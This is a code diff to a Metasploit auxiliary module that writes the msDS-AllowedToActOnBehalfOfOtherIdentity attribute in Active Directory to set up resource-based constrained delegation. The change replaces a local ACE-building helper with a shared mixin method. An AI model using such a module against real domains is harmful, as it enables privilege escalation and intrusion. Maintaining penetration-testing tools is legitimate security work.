@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP::ActiveDirectory
+  include Msf::Exploit::Remote::LDAP::ActiveDirectoryAttributeBuilders
   include Msf::OptionalSession::LDAP
 
   ATTRIBUTE = 'msDS-AllowedToActOnBehalfOfOtherIdentity'.freeze
@@ -53,18 +54,6 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('DELEGATE_TO', [ true, 'The delegation target' ]),
       OptString.new('DELEGATE_FROM', [ false, 'The delegation source' ])
     ])
-  end
-
-  def build_ace(sid)
-    Rex::Proto::MsDtyp::MsDtypAce.new({
-      header: {
-        ace_type: Rex::Proto::MsDtyp::MsDtypAceType::ACCESS_ALLOWED_ACE_TYPE
-      },
-      body: {
-        access_mask: Rex::Proto::MsDtyp::MsDtypAccessMask::ALL,
-        sid: sid
-      }
-    })
   end
 
   def get_delegate_to_obj
@@ -247,7 +236,7 @@ class MetasploitModule < Msf::Auxiliary
     security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
     security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
     security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
-    security_descriptor.dacl.aces << build_ace(delegate_from_sid)
+    security_descriptor.dacl.aces << adds_build_rbcd_ace(delegate_from_sid)
 
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("New #{ATTRIBUTE}: #{sddl}")
@@ -284,7 +273,7 @@ class MetasploitModule < Msf::Auxiliary
       security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
     end
 
-    security_descriptor.dacl.aces << build_ace(delegate_from_sid)
+    security_descriptor.dacl.aces << adds_build_rbcd_ace(delegate_from_sid)
 
     if (sddl = sd_to_sddl(security_descriptor))
       vprint_status("New #{ATTRIBUTE}: #{sddl}")
